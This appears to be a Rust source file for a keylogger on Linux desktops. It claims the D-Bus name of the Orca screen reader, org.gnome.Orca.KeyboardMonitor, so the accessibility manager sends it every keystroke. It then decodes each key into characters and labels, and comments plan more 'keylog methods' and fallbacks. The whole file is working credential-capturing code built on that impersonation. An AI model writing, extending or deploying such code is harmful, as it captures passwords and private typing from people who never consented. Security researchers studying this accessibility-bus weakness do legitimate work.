use zbus::blocking::Connection;
use zbus::MatchRule;
use zbus::message::Type as MessageType;
use std::sync::mpsc;
use std::thread;

#[derive(Debug, Clone)]
pub struct KeyEvent {
    pub pressed: bool,
    pub keysym: u32,
    pub charcode: u32,
    pub scancode: u16,
}

impl KeyEvent {
    pub fn as_char(&self) -> Option<char> {
        if self.charcode >= 32 && self.charcode < 127 {
            Some(char::from(self.charcode as u8))
        } else {
            None
        }
    }

    pub fn as_label(&self) -> String {
        match self.keysym {
            65293 => "[ENTER]".into(),
            65288 => "[BS]".into(),
            65289 => "[TAB]".into(),
            65507 | 65508 => "[CTRL]".into(),
            65505 | 65506 => "[SHIFT]".into(),
            65513 | 65514 => "[ALT]".into(),
            65515 => "[SUPER]".into(),
            _ => self.as_char()
                .map(|c| c.to_string())
                .unwrap_or_else(|| format!("[{}]", self.keysym)),
        }
    }
}


// Testing implementing method from https://linnemanlabs.com/posts/hello-my-name-is-orca/
// Will expand to many other methods in the future and abstract this away and add fallbacks etc
pub fn start(conn: &Connection) -> zbus::Result<mpsc::Receiver<KeyEvent>> {
    conn.request_name("org.gnome.Orca.KeyboardMonitor")?;

    conn.call_method(
        Some("org.freedesktop.a11y.Manager"),
        "/org/freedesktop/a11y/Manager",
        Some("org.freedesktop.a11y.KeyboardMonitor"),
        "WatchKeyboard",
        &(),
    )?;

    let (tx, rx) = mpsc::channel();

    let conn_clone = conn.clone();
    thread::spawn(move || {
        let rule = MatchRule::builder()
            .msg_type(MessageType::Signal)
            .interface("org.freedesktop.a11y.KeyboardMonitor").unwrap()
            .member("KeyEvent").unwrap()
            .build();

        let proxy = zbus::blocking::fdo::DBusProxy::new(&conn_clone).unwrap();
        proxy.add_match_rule(rule).unwrap();

        let iter = zbus::blocking::MessageIterator::from(&conn_clone);
        for msg in iter {
            let msg: zbus::Message = match msg {
                Ok(m) => m,
                Err(_) => continue,
            };
            let member = msg.header().member().map(|m| m.as_str().to_string());
            if member.as_deref() == Some("KeyEvent") {
                if let Ok((pressed, _flags, keysym, charcode, scancode)) =
                    msg.body().deserialize::<(bool, u32, u32, u32, u16)>()
                {
                    let _ = tx.send(KeyEvent {
                        pressed,
                        keysym,
                        charcode,
                        scancode,
                    });
                }
            }
        }
    });

    Ok(rx)
}

// Will need to abstract this away as I implement multiple keylog methods/fallbacks/etc
pub fn stop(conn: &Connection) -> zbus::Result<()> {
    conn.call_method(
        Some("org.freedesktop.a11y.Manager"),
        "/org/freedesktop/a11y/Manager",
        Some("org.freedesktop.a11y.KeyboardMonitor"),
        "UnwatchKeyboard",
        &(),
    )?;
    Ok(())
}